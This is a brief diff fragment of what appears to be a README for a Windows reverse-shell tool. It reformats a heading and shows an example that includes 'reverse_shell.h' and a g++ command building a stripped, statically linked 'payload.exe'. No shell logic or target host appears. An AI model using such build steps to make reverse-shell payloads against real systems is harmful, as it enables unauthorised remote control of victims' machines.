@@ -32,9 +32,8 @@ int main() //
     return 0;
 }
   ```
-  
-  ## Exemple Payload Object :
-  ```cpp
+## Exemple Payload Object :
+```cpp
   #include "reverse_shell.h"
 // compile : g++ socket_winbd.cpp reverse_shell.cpp try_rev_shell.cpp -o payload.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
 
